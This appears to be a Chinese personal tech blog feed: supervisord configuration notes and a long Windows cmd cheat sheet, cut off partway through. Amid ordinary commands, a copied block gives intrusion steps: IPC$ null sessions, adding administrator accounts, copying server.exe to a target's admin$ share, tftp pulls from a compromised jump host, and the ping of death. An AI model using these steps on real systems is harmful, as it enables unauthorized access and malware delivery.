class="code"><pre><span class="line">supervisord</span><br></pre></td></tr></table></figure><h1 id="配置"><a class="markdownIt-Anchor" href="#配置"></a> 配置</h1><ul><li>样例</li></ul><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[program:meta.txn.recover.on.error]</span> <span class="comment">;配置监控程序名称</span></span><br><span class="line"><span class="attr">command</span>=/cas/bin/meta.sh      <span class="comment">; 启动被监控的进程命令</span></span><br><span class="line"><span class="attr">numprocs</span>=<span class="number">1</span>                    <span class="comment">; 启动几个进程</span></span><br><span class="line"><span class="attr">directory</span>=/cas/bin            <span class="comment">; 执行前要不要先cd到目录去，一般不用</span></span><br><span class="line"><span class="attr">autostart</span>=<span class="literal">true</span>                <span class="comment">; 随着supervisord的启动而启动</span></span><br><span class="line"><span class="attr">autorestart</span>=<span class="literal">true</span>              <span class="comment">; 自动重启。。当然要选上了</span></span><br><span class="line"><span class="attr">startretries</span>=<span class="number">10</span>               <span class="comment">; 启动失败时的最多重试次数</span></span><br><span class="line"><span class="attr">exitcodes</span>=<span class="number">0</span>                   <span class="comment">; 正常退出代码（是说退出代码是这个时就不再重启了吗？待确定）</span></span><br><span class="line"><span class="attr">stopsignal</span>=KILL               <span class="comment">; 用来杀死进程的信号</span></span><br><span class="line"><span class="attr">stopwaitsecs</span>=<span class="number">10</span>               <span class="comment">; 发送SIGKILL前的等待时间</span></span><br><span class="line"><span class="attr">redirect_stderr</span>=<span class="literal">true</span>          <span class="comment">; 重定向stderr到stdout</span></span><br><span class="line"><span class="attr">stdout_logfile</span>=logfile        <span class="comment">; 指定日志文件，会在执行目录创建日志文件</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>配置</th><th>说明</th></tr></thead><tbody></tbody></table><h1 id="常用命令"><a class="markdownIt-Anchor" href="#常用命令"></a> 常用命令</h1><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>supervisorctl start programxxx</td><td>启动某个进程</td></tr><tr><td>supervisorctl restart programxxx</td><td>重启某个进程</td></tr><tr><td>supervisorctl stop groupworker:</td><td>重启所有属于名为groupworker这个分组的进程(start,restart同理)</td></tr><tr><td>supervisorctl stop all</td><td>停止全部进程，注：start、restart、stop都不会载入最新的配置文件。</td></tr><tr><td>supervisorctl reload</td><td>载入最新的配置文件，停止原有进程并按新的配置启动、管理所有进程。</td></tr><tr><td>supervisorctl update</td><td>根据最新的配置文件，启动新配置或有改动的进程，配置没有改动的进程不会受影响而重启。</td></tr><tr><td>supervisorctl</td><td>查看正在守候的进程</td></tr></tbody></table><ul><li>注意：显式用stop停止掉的进程，用reload或者update都不会自动重启</li><li>supervisor启动和停止的日志文件存放在/var/log/supervisor/supervisord.log</li></ul><h1 id="问题汇总"><a class="markdownIt-Anchor" href="#问题汇总"></a> 问题汇总</h1><h2 id="errorclass-socketerror-errno-2-no-such-file-or-directory-file-usrlib64python27socket"><a class="markdownIt-Anchor" href="#errorclass-socketerror-errno-2-no-such-file-or-directory-file-usrlib64python27socket"></a> error:class ‘socket.error’ [Errno 2] No such file or directory: file: /usr/lib64/python2.7/socket</h2><ul><li>问题：supervisor 配置完毕，使用supervisorctl reload 和supervisorctl update 启动时候报错</li><li>解决方法：使用下面命令启动</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/bin/python2 /usr/bin/supervisord -c /etc/supervisor/supervisord.conf</span><br></pre></td></tr></table></figure><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> programme </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cmd</title>
      <link href="/2020/08/02/cmd/"/>
      <url>/2020/08/02/cmd/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>windows常用cmd命令</p></blockquote><a id="more"></a><h1 id="常用基本命令"><a class="markdownIt-Anchor" href="#常用基本命令"></a> 常用基本命令</h1><table><thead><tr><th>命令</th><th>说明</th><th>举例</th></tr></thead><tbody><tr><td>tasklist</td><td>列出所有任务及进程号</td><td>tasklist /?  获取使用帮助</td></tr><tr><td>taskkill</td><td>杀进程</td><td>taskkill /?  获取使用帮助</td></tr><tr><td>cd</td><td>切换目录</td><td>cd /?     //获取使用帮助<br>cd \       //跳转到硬盘的根目录<br>cd C:\WINDOWS  //跳转到当前硬盘的其他文件<br>d:        //跳转到其他硬盘<br>cd /d e:\software    //跳转到其他硬盘的其他文件夹。注意此处必须加/d参数。否则无法跳转。<br>cd…      //跳转到上一层目录</td></tr><tr><td>netstat</td><td>查看网络连接状态：显示协议统计信息和当前 TCP/IP 网络连接。该命令可以查看当前机器建立的所有网络链接状态，以及对应哪个进程。</td><td>netstat -help 获取命令行使用帮助信息<br>netstat -ano  //查看网络连接、状态以及对应的进程id</td></tr><tr><td>find</td><td>查询</td><td>find /？获取使用帮助<br>netstat -ano</td></tr><tr><td>ping</td><td></td><td>ping -help</td></tr><tr><td>tracert</td><td>tracert也被称为Windows路由跟踪实用程序，在命令提示符（cmd）中使用tracert命令可以用于确定IP数据包访问目标时所选择的路径。</td><td>tracert /? 获取使用帮助<br>tracert <a href="http://www.baidu.com">www.baidu.com</a></td></tr><tr><td>ipconfig</td><td>#查看自己的ip</td><td></td></tr><tr><td><code>|</code></td><td>cmd命令中<code>|</code>代表前一个的输出代表后一个的输入</td><td></td></tr><tr><td><code>&gt; &gt;&gt;</code></td><td>重定向输出符号</td><td>将原本输出到命令窗口的内容，转存到文件中，如jstack 12912 &gt;d:/s.txt  打印线程到指定文件<br>cmd &gt;重定向输出并覆盖源文件。 <br> cmd &gt;&gt;重定向输出追加到文件末尾</td></tr><tr><td><code>&lt; &lt;&lt;</code></td><td>重定向输出符号</td><td>cmd &lt; file:使cmd命令从file读入<br>cmd &lt;&lt; text:从命令行读取输入，直到一个与text相同的行结束。除非使用引号把输入括起来，此模式将对输入内容进行shell变量替换。如果使用 &lt;&lt;- ，则会忽略接下来输入行首的tab，结束行也可以是一堆tab再加上一个与text相同的内容，可以参考后面的例子。cmd &lt;&lt;&lt; word:把word（而不是文件word）和后面的换行作为输入提供给cmd。<br>cmd &lt;&gt; file:以读写模式把文件file重定向到输入，文件file不会被破坏。仅当应用程序利用了这一特性时，它才是有意义的。<br>cmd &gt;</td></tr><tr><td><code>ctrl+c</code></td><td>终止一直在运行的命令</td><td>有时某个命令一直打印输出结果(如ping 192.168.1.10 -t)，我们想终止这个命令的执行，直接按ctrl+c即可。</td></tr><tr><td>cls</td><td>清空cmd窗口内容命令</td><td>有时cmd内容太多，滚动费尽，需要清空屏幕内容，直接输入cls即可</td></tr></tbody></table><h1 id="windows工具"><a class="markdownIt-Anchor" href="#windows工具"></a> windows工具</h1><p>|gpedit.msc|组策略||<br />|sndrec32|录音机||<br />|Nslookup|IP地址侦测器 ，是一个 监测网络中 DNS 服务器是否能正确实现域名解析的命令行工具。 它在 Windows NT/2000/XP 中均可使用 , 但在 Windows 98 中却没有集成这一个工具。||<br />|explorer|打开资源管理器||<br />|logoff|注销命令||<br />|shutdown|60秒倒计时关机命令||<br />|lusrmgr.msc|本机用户和组||<br />|services.msc|本地服务设置||<br />|oobe/msoobe /a|检查XP是否激活||<br />|notepad|打开记事本||<br />|cleanmgr|垃圾整理||<br />|net start messenger|开始信使服务||<br />|compmgmt.msc|计算机管理||<br />|net stop messenger|停止信使服务||<br />|conf|启动netmeeting||<br />|dvdplay|DVD播放器||<br />|charmap|启动字符映射表||<br />|diskmgmt.msc|磁盘管理实用程序||<br />|calc|启动计算器||<br />|dfrg.msc|磁盘碎片整理程序||<br />|chkdsk.exe|Chkdsk磁盘检查||<br />|devmgmt.msc|设备管理器||<br />|regsvr32 /u *.dll|停止dll文件运行||<br />|drwtsn32|系统医生||<br />|rononce -p|15秒关机||<br />|dxdiag|检查DirectX信息||<br />|regedt32|注册表编辑器||<br />|Msconfig.exe|系统配置实用程序||<br />|rsop.msc|组策略结果集||<br />|mem.exe|显示内存使用情况||<br />|regedit.exe|注册表||<br />|winchat|XP自带局域网聊天||<br />|progman|程序管理器||<br />|winmsd|系统信息||<br />|perfmon.msc|计算机性能监测程序||<br />|winver|检查Windows版本||<br />|sfc /scannow|扫描错误并复原||<br />|taskmgr|任务管理器（2000/xp/2003||<br />|winver|检查Windows版本||<br />|wmimgmt.msc|打开windows管理体系结构(WMI)||<br />|wupdmgr|windows更新程序||<br />|wscript|windows脚本宿主设置||<br />|write|写字板||<br />|winmsd|系统信息||<br />|wiaacmgr|扫描仪和照相机向导||<br />|winchat|XP自带局域网聊天||<br />|mem.exe|显示内存使用情况||<br />|Msconfig.exe|系统配置实用程序||<br />|mplayer2|简易widnows media player||<br />|mspaint|画图板||<br />|mstsc|远程桌面连接||<br />|mplayer2|媒体播放机||<br />|magnify|放大镜实用程序||<br />|mmc|打开控制台||<br />|mobsync|同步命令||<br />|dxdiag|检查DirectX信息||<br />|iexpress|木马捆绑工具，系统自带 58. fsmgmt.msc—–共享文件夹管理器||<br />|utilman|辅助工具管理器||<br />|diskmgmt.msc|磁盘管理实用程序||<br />|dcomcnfg|打开系统组件服务||<br />|ddeshare|打开DDE共享设置||<br />|osk|打开屏幕键盘||<br />|odbcad32|ODBC数据源管理器||<br />|oobe/msoobe /a|检查XP是否激活 114. logoff———注销命令||<br />|notepad|打开记事本||<br />|nslookup|网络管理的工具向导||<br />|ntbackup|系统备份和还原||<br />|narrator|屏幕“讲述人”||<br />|ntmsmgr.msc|移动存储管理器||<br />|ntmsoprq.msc|移动存储管理员操作请求||<br />|netstat -an|(TC)命令检查接口||<br />|syncapp|创建一个公文包||<br />|sysedit|系统配置编辑器||<br />|sigverif|文件签名验证程序||<br />|ciadv.msc|索引服务程序||<br />|shrpubw|创建共享文件夹||<br />|secpol.msc|本地安全策略||<br />|syskey|系统加密，一旦加密就不能解开，保护windows xp系统的双重密码||<br />|services.msc|本地服务设置||<br />|Sndvol32|音量控制程序||<br />|sfc.exe|系统文件检查器||<br />|sfc /scannow|windows文件保护||<br />|ciadv.msc|索引服务程序||<br />|tourstart|xp简介（安装完成后出现的漫游xp程序）||<br />|taskmgr|任务管理器||<br />|eventvwr|事件查看器||<br />|eudcedit|造字程序||<br />|compmgmt.msc|计算机管理||<br />|packager|对象包装程序||<br />|perfmon.msc|计算机性能监测程序||<br />|charmap|启动字符映射表||<br />|cliconfg|SQL SERVER 客户端网络实用程序||<br />|Clipbrd|剪贴板查看器||<br />|conf|启动netmeeting||<br />|certmgr.msc|证书管理实用程序||<br />|regsvr32 /u *.dll|停止dll文件运行||<br />|regsvr32 /u zipfldr.dll|取消ZIP支持||<br />|cmd.exe|CMD命令提示符||<br />|chkdsk.exe|Chkdsk磁盘检查 ||</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use ipipc$ &quot; &quot; &#x2F;user:&quot; &quot; 建立IPC空链接</span><br><span class="line">　　net use ipipc$ &quot;密码&quot; &#x2F;user:&quot;用户名&quot; 建立IPC非空链接</span><br><span class="line">　　net use h: ipc$ &quot;密码&quot; &#x2F;user:&quot;用户名&quot; 直接登陆后映射对方C：到本地为H:</span><br><span class="line">　　net use h: ipc$ 登陆后映射对方C：到本地为H:</span><br><span class="line">　　net use ipipc$ &#x2F;del 删除IPC链接</span><br><span class="line">　　net use h: &#x2F;del 删除映射对方到本地的为H:的映射</span><br><span class="line">　　net user 用户名　密码　&#x2F;add 建立用户</span><br><span class="line">　　net user guest &#x2F;active:yes 激活guest用户</span><br><span class="line">　　net user 查看有哪些用户</span><br><span class="line">　　net user 帐户名 查看帐户的属性</span><br><span class="line">　　net localgroup administrators 用户名 &#x2F;add 把“用户”添加到管理员中使其具有管理员权限</span><br><span class="line">　　net start 查看开启了哪些服务</span><br><span class="line">　　net start 服务名　开启服务；(如:net start telnet， net start schedule)</span><br><span class="line">　　net stop 服务名 停止某服务</span><br><span class="line">　　net time 目标ip 查看对方时间</span><br><span class="line">　　net time 目标ip &#x2F;set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数&#x2F;yes可取消确认信息</span><br><span class="line">　　net view 查看本地局域网内开启了哪些共享</span><br><span class="line">　　net view ip 查看对方局域网内开启了哪些共享</span><br><span class="line">　　net config 显示系统网络设置</span><br><span class="line">　　net logoff 断开连接的共享</span><br><span class="line">　　net pause 服务名 暂停某服务</span><br><span class="line">　　net send ip &quot;文本信息&quot; 向对方发信息</span><br><span class="line">　　net ver 局域网内正在使用的网络连接类型和信息</span><br><span class="line">　　net share 查看本地开启的共享</span><br><span class="line">　　net share ipc$ 开启ipc$共享</span><br><span class="line">　　net share ipc$ &#x2F;del 删除ipc$共享</span><br><span class="line">　　net share c$ &#x2F;del 删除C：共享</span><br><span class="line">　　net user guest 12345 用guest用户登陆后用将密码改为12345</span><br><span class="line">　　net password 密码 更改系统登陆密码</span><br><span class="line">　　netstat -a 查看开启了哪些端口,常用netstat -an</span><br><span class="line">　　netstat -n 查看端口的网络连接情况，常用netstat -an</span><br><span class="line">　　netstat -v 查看正在进行的工作</span><br><span class="line">　　netstat -p 协议名 例：netstat -p tcq&#x2F;ip 查看某协议使用情况</span><br><span class="line">　　netstat -s 查看正在使用的所有协议使用情况</span><br><span class="line">　　nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名</span><br><span class="line">　　tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。</span><br><span class="line">　　ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。</span><br><span class="line">　　ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping)</span><br><span class="line">　　ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“&#x2F;all”显示全部配置信息</span><br><span class="line">　　tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support&#x2F;tools文件夹内)</span><br><span class="line">　　kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support&#x2F;tools文件夹内)</span><br><span class="line">　　del -F 文件名 加-F参数后就可删除只读文件,&#x2F;AR、&#x2F;AH、&#x2F;AS、&#x2F;AA分别表示删除只读、隐藏、系统、存档文件，&#x2F;A-R、&#x2F;A-H、&#x2F;A-S、&#x2F;A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL&#x2F;AR *.*”表示删除当前目录下所有只读文件，“DEL&#x2F;A-S *.*”表示删除当前目录下除系统文件以外的所有文件</span><br><span class="line">　　del &#x2F;S &#x2F;Q 目录 或用：rmdir &#x2F;s &#x2F;Q 目录 &#x2F;S删除目录及目录下的所有子目录和文件。同时使用参数&#x2F;Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）</span><br><span class="line">　　move 盘符路径要移动的文件名　存放移动文件的路径移动后文件名 移动文件,用参数&#x2F;y将取消确认移动目录存在相同文件的提示就直接覆盖</span><br><span class="line">　　fc one.txt two.txt &gt; 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，&quot;&gt; &quot;和&quot;&gt; &gt;&quot; 是重定向命令</span><br><span class="line">　　at id号 开启已注册的某个计划任务</span><br><span class="line">　　at &#x2F;delete 停止所有计划任务，用参数&#x2F;yes则不需要确认就直接停止</span><br><span class="line">　　at id号 &#x2F;delete 停止某个已注册的计划任务</span><br><span class="line">　　at 查看所有的计划任务</span><br><span class="line">　　at ip time 程序名(或一个命令) &#x2F;r 在某时间运行对方某程序并重新启动计算机</span><br><span class="line">　　finger username @host 查看最近有哪些用户登陆</span><br><span class="line">　　telnet ip 端口 远和登陆服务器,默认端口为23</span><br><span class="line">　　open ip 连接到IP（属telnet登陆后的命令）</span><br><span class="line">　　telnet 在本机上直接键入telnet 将进入本机的telnet</span><br><span class="line">　　copy 路径文件名1　路径文件名2 &#x2F;y 复制文件1到指定的目录为文件2，用参数&#x2F;y就同时取消确认你要改写一份现存目录文件</span><br><span class="line">　　copy c:srv.exe ipadmin$ 复制本地c:srv.exe到对方的admin下</span><br><span class="line">　　copy 1st.jpg&#x2F;b+2st.txt&#x2F;a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：&#x2F;b指二进制文件，&#x2F;a指ASCLL格式文件</span><br><span class="line">　　copy ipadmin$svv.exe c: 或:copyipadmin$*.* 复制对方admini$共享下的srv.exe文件（所有文件）至本地C：</span><br><span class="line">　　xcopy 要复制的文件或目录树　目标地址目录名 复制文件和目录树，用参数&#x2F;Y将不提示覆盖相同文件</span><br><span class="line">　　用参数&#x2F;e才可连目录下的子目录一起复制到目标地址下。</span><br><span class="line">　　tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:server.exe 登陆后，将“IP”的server.exe下载到目标主机c:server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送</span><br><span class="line">　　tftp -i 对方IP　put c:server.exe 登陆后，上传本地c:server.exe至主机</span><br><span class="line">　　ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时)</span><br><span class="line">　　route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface</span><br><span class="line">　　arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息</span><br><span class="line">　　start 程序名或命令 &#x2F;max 或&#x2F;min 新开一个新窗口并最大化（最小化）运行某程序或命令</span><br><span class="line">　　mem 查看cpu使用情况</span><br><span class="line">　　attrib 文件名(目录名) 查看某文件（目录）的属性</span><br><span class="line">　　attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用+则是添加为某属性</span><br><span class="line">　　dir 查看文件，参数：&#x2F;Q显示文件及目录属系统哪个用户，&#x2F;T:C显示文件创建时间，&#x2F;T:A显示文件上次被访问时间，&#x2F;T:W上次被修改时间</span><br><span class="line">　　date &#x2F;t 、 time &#x2F;t 使用此参数即“DATE&#x2F;T”、“TIME&#x2F;T”将只显示当前日期和时间，而不必输入新日期和时间</span><br><span class="line">　　set 指定环境变量名称&#x3D;要指派给变量的字符 设置环境变量</span><br><span class="line">　　set 显示当前所有的环境变量</span><br><span class="line">　　set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量</span><br><span class="line">　　pause 暂停批处理程序，并显示出：请按任意键继续....</span><br><span class="line">　　if 在批处理程序中执行条件处理（更多说明见if命令及变量）</span><br><span class="line">　　goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签）</span><br><span class="line">　　call 路径批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call &#x2F;?）</span><br><span class="line">　　for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）</span><br><span class="line">　　echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置</span><br><span class="line">　　echo 信息 在屏幕上显示出信息</span><br><span class="line">　　echo 信息 &gt;&gt; pass.txt 将&quot;信息&quot;保存到pass.txt文件中</span><br><span class="line">　　findstr &quot;Hello&quot; aa.txt 在aa.txt文件中寻找字符串hello</span><br><span class="line">　　find 文件名 查找某文件</span><br><span class="line">　　title 标题名字 更改CMD窗口标题名字</span><br><span class="line">　　color 颜色值 设置cmd控制台前景和背景颜色；0&#x3D;黑、1&#x3D;蓝、2&#x3D;绿、3&#x3D;浅绿、4&#x3D;红、5&#x3D;紫、6&#x3D;黄、7&#x3D;白、8&#x3D;灰、9&#x3D;淡蓝、A&#x3D;淡绿、B&#x3D;淡浅绿、C&#x3D;淡红、D&#x3D;淡紫、E&#x3D;淡黄、F&#x3D;亮白</span><br><span class="line">　　prompt 名称 更改cmd.exe的显示的命令提示符(把C:、D:统一改为：EntSky )</span><br><span class="line">　　ver 在DOS窗口下显示版本信息</span><br><span class="line">　　winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）</span><br><span class="line">　　format 盘符 &#x2F;FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: &#x2F;FS:NTFS</span><br><span class="line">　　md　目录名 创建目录</span><br><span class="line">　　replace 源文件　要替换文件的目录 替换文件</span><br><span class="line">　　ren 原文件名　新文件名 重命名文件名</span><br><span class="line">　　tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称</span><br><span class="line">　　type 文件名 显示文本文件的内容</span><br><span class="line">　　more 文件名 逐屏显示输出文件</span><br><span class="line">　　doskey 要锁定的命令&#x3D;字符</span><br><span class="line">　　doskey 要解锁命令&#x3D; 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir&#x3D;entsky (不能用doskey dir&#x3D;dir)；解锁：doskey dir&#x3D;</span><br><span class="line">　　taskmgr 调出任务管理器</span><br><span class="line">　　chkdsk &#x2F;F D: 检查磁盘D并显示状态报告；加参数&#x2F;f并修复磁盘上的错误</span><br><span class="line">　　tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口</span><br><span class="line">　　exit 退出cmd.exe程序或目前，用参数&#x2F;B则是退出当前批处理脚本而不是cmd.exe</span><br><span class="line">　　path 路径可执行文件的文件名 为可执行文件设置一个路径。</span><br><span class="line">　　cmd 启动一个win2K命令解释窗口。参数：&#x2F;eff、&#x2F;en 关闭、开启命令扩展；更我详细说明见cmd &#x2F;?</span><br><span class="line">　　regedit &#x2F;s 注册表文件名 导入注册表；参数&#x2F;S指安静模式导入，无任何提示；</span><br><span class="line">　　regedit &#x2F;e 注册表文件名 导出注册表</span><br><span class="line">　　cacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：&#x2F;D 用户名:设定拒绝某用户访问；&#x2F;P 用户名:perm 替换指定用户的访问权限；&#x2F;G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D: est.txt &#x2F;D pub 设定d: est.txt拒绝pub用户访问。</span><br><span class="line">　　cacls 文件名 查看文件的访问用户权限列表</span><br><span class="line">　　REM 文本内容 在批处理文件中添加注解</span><br><span class="line">　　netsh 查看或更改本地网络配置情况</span><br><span class="line">　　IIS服务命令</span><br><span class="line">　　iisreset &#x2F;reboot 重启win2k计算机（但有提示系统将重启信息出现）</span><br><span class="line">　　iisreset &#x2F;start或stop 启动（停止）所有Internet服务</span><br><span class="line">　　iisreset &#x2F;restart 停止然后重新启动所有Internet服务</span><br><span class="line">　　iisreset &#x2F;status 显示所有Internet服务状态</span><br><span class="line">　　iisreset &#x2F;enable或disable 在本地系统上启用（禁用）Internet服务的重新启动</span><br><span class="line">　　iisreset &#x2F;rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机</span><br><span class="line">　　iisreset &#x2F;noforce 若无法停止Internet服务，将不会强制终止Internet服务</span><br><span class="line">　　iisreset &#x2F;timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定&#x2F;rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。</span><br><span class="line">　　FTP 命令： (后面有详细说明内容)</span><br><span class="line">　　ftp的命令行格式为:</span><br><span class="line">　　ftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。</span><br><span class="line">　　－d 使用调试方式。</span><br><span class="line">　　－n 限制ftp的自动登录,即不使用.netrc文件。</span><br><span class="line">　　－g 取消全局文件名。</span><br><span class="line">　　help [命令] 或 ？[命令] 查看命令说明</span><br><span class="line">　　bye 或 quit 终止主机FTP进程,并退出FTP管理方式.</span><br><span class="line">　　pwd 列出当前远端主机目录</span><br><span class="line">　　put 或 send 本地文件名 [上传到主机上的文件名] 将本地一个文件传送至远端主机中</span><br><span class="line">　　get 或 recv [远程主机文件名] [下载到本地后的文件名] 从远端主机中传送至本地主机中</span><br><span class="line">　　mget [remote-files] 从远端主机接收一批文件至本地主机</span><br><span class="line">　　mput local-files 将本地主机中一批文件传送至远端主机</span><br><span class="line">　　dir 或 ls [remote-directory] [local-file] 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件</span><br><span class="line">　　ascii 设定以ASCII方式传送文件(缺省值)</span><br><span class="line">　　bin 或 image 设定以二进制方式传送文件</span><br><span class="line">　　bell 每完成一次文件传送,报警提示</span><br><span class="line">　　cdup 返回上一级目录</span><br><span class="line">　　close 中断与远程服务器的ftp会话(与open对应)</span><br><span class="line">　　open host[port] 建立指定ftp服务器连接,可指定连接端口</span><br><span class="line">　　delete 删除远端主机中的文件</span><br><span class="line">　　mdelete [remote-files] 删除一批文件</span><br><span class="line">　　mkdir directory-name 在远端主机中建立目录</span><br><span class="line">　　rename [from] [to] 改变远端主机中的文件名</span><br><span class="line">　　rmdir directory-name 删除远端主机中的目录</span><br><span class="line">　　status 显示当前FTP的状态</span><br><span class="line">　　system 显示远端主机系统类型</span><br><span class="line">　　user user-name [password] [account] 重新以别的用户名登录远端主机</span><br><span class="line">　　open host [port] 重新建立一个新的连接</span><br><span class="line">　　prompt 交互提示模式</span><br><span class="line">　　macdef 定义宏命令</span><br><span class="line">　　lcd 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录</span><br><span class="line">　　chmod 改变远端主机的文件权限</span><br><span class="line">　　case 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母</span><br><span class="line">　　cd remote－dir 进入远程主机目录</span><br><span class="line">　　cdup 进入远程主机目录的父目录</span><br><span class="line">　　! 在本地机中执行交互shell，exit回到ftp环境,如!ls*.zip</span><br><span class="line">　　#5</span><br><span class="line">　　MYSQL 命令</span><br><span class="line">　　mysql -h主机地址 -u用户名 －p密码 连接MYSQL;如果刚安装好MYSQL，超级用户root是没有密码的。</span><br><span class="line">　　（例：mysql -h110.110.110.110 -Uroot -P123456</span><br><span class="line">　　注:u与root可以不用加空格，其它也一样）</span><br><span class="line">　　exit 退出MYSQL</span><br><span class="line">　　mysqladmin -u用户名 -p旧密码 password 新密码 修改密码</span><br><span class="line">　　grant select on 数据库.* to 用户名@登录主机 identified by &quot;密码&quot;; 增加新用户。（注意：和上面不同，下面的因为是MYSQL环境中的命令，所以后面都带一个分号作为命令结束符）</span><br><span class="line">　　show databases; 显示数据库列表。刚开始时才两个数据库：mysql和test。mysql库很重要它里面有MYSQL的系统信息，我们改密码和新增用户，实际上就是用这个库进行操作。</span><br><span class="line">　　use mysql；</span><br><span class="line">　　show tables; 显示库中的数据表</span><br><span class="line">　　describe 表名; 显示数据表的结构</span><br><span class="line">　　create database 库名; 建库</span><br><span class="line">　　use 库名；</span><br><span class="line">　　create table 表名 (字段设定列表)； 建表</span><br><span class="line">　　drop database 库名;</span><br><span class="line">　　drop table 表名； 删库和删表</span><br><span class="line">　　delete from 表名; 将表中记录清空</span><br><span class="line">　　select * from 表名; 显示表中的记录</span><br><span class="line">　　mysqldump --opt school&gt;school.bbb 备份数据库：（命令在DOS的mysqlin目录下执行）;注释:将数据库school备份到school.bbb文件，school.bbb是一个文本文件，文件名任取，打开看看你会有新发现。</span><br><span class="line">　　win2003系统下新增命令（实用部份）：</span><br><span class="line">　　shutdown &#x2F;参数 关闭或重启本地或远程主机。</span><br><span class="line">　　参数说明：&#x2F;S 关闭主机，&#x2F;R 重启主机， &#x2F;T 数字 设定延时的时间，范围0～180秒之间， &#x2F;A取消开机，&#x2F;M &#x2F;&#x2F;IP 指定的远程主机。</span><br><span class="line">　　例：shutdown &#x2F;r &#x2F;t 0 立即重启本地主机（无延时）</span><br><span class="line">　　taskill &#x2F;参数 进程名或进程的pid 终止一个或多个任务和进程。</span><br><span class="line">　　参数说明：&#x2F;PID 要终止进程的pid,可用tasklist命令获得各进程的pid，&#x2F;IM 要终止的进程的进程名，&#x2F;F 强制终止进程，&#x2F;T 终止指定的进程及他所启动的子进程。</span><br><span class="line">　　tasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。</span><br><span class="line">　　参数说明：&#x2F;M 列出当前进程加载的dll文件，&#x2F;SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。</span><br><span class="line">　　Linux系统下基本命令　注：要区分大小写</span><br><span class="line">　　uname 显示版本信息（同win2K的 ver）</span><br><span class="line">　　dir 显示当前目录文件,ls -al 显示包括隐藏文件（同win2K的 dir）</span><br><span class="line">　　pwd 查询当前所在的目录位置</span><br><span class="line">　　cd cd　..回到上一层目录，注意cd 与..之间有空格。cd　&#x2F;返回到根目录。</span><br><span class="line">　　cat 文件名 查看文件内容</span><br><span class="line">　　cat &gt;abc.txt 往abc.txt文件中写上内容。</span><br><span class="line">　　more 文件名 以一页一页的方式显示一个文本文件。</span><br><span class="line">　　cp 复制文件</span><br><span class="line">　　mv 移动文件</span><br><span class="line">　　rm 文件名 删除文件，rm -a 目录名删除目录及子目录</span><br><span class="line">　　